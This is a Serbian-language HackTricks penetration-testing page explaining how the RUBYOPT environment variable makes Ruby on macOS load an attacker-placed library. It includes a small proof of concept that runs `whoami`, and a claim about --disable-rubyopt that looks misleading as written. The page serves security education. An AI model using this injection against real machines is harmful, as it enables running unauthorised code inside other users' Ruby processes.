# Injekcija u Ruby aplikacije na macOS-u

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Korišćenjem ove env promenljive moguće je **dodati nove parametre** komandi **ruby** svaki put kada se izvrši. Iako parametar **`-e`** ne može da se koristi za navođenje Ruby koda koji treba izvršiti, moguće je koristiti parametre **`-I`** i **`-r`** za dodavanje nove fascikle putanji biblioteka koje treba učitati, a zatim **navesti biblioteku za učitavanje**.

Kreirajte biblioteku **`inject.rb`** u fascikli **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Kreirajte bilo gde Ruby skriptu kao što je:
```ruby:hello.rb
puts 'Hello, World!'
```
Zatim navedite proizvoljnu ruby skriptu da ga učita pomoću:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Zanimljiva činjenica, radi čak i sa parametrom **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
